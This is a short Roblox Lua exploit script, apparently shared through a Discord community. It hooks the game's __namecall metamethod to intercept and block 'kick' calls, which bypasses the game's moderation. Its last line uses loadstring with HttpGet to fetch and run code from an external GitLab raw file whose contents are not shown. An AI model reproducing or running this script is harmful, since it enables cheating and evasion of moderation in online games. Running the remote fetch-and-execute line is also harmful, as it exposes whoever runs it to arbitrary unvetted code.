--[[
discord.gg/thedevs
credits to Exunys (https://github.com/Exunys)
]]

local Players = game:GetService("Players")
local OldNameCall = nil

OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
    local NameCallMethod = getnamecallmethod()

    if tostring(string.lower(NameCallMethod)) == "kick" then
          error("Bypassed Kick")
        return nil
    end
    
    return OldNameCall(Self, ...)
end)


loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))()
